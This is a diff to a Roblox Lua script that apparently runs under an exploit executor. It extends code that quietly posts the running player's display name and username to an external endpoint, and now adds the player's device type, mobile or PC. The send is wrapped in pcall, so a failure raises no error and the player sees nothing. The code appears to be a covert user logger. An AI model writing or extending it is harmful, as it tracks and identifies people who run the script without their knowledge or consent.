@@ -144,6 +144,7 @@ end)
 
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
+local UserInputService = game:GetService("UserInputService")
 
 local HTTP = (syn and syn.request) or (http and http.request) or request or HttpPost
 if not HTTP then return end
@@ -154,9 +155,12 @@ local player = Players.LocalPlayer
 local displayName = player.DisplayName
 local username = player.Name
 
--- Proste, estetyczne formatowanie
+-- Check if the player is on mobile or PC
+local deviceType = (UserInputService.TouchEnabled and "📱 Mobile") or "🖥️ PC"
+
+-- Create the message data with device type and user info
 local data = {
-    ["content"] = "**Display Name:** " .. displayName .. "\n**Username:** " .. username
+    ["content"] = "**Display Name:** " .. displayName .. "\n**Username:** " .. username .. "\n**Device:** " .. deviceType
 }
 
 pcall(function()
@@ -167,6 +171,7 @@ pcall(function()
         Body = HttpService:JSONEncode(data)
     })
 end)
+
 
 
 
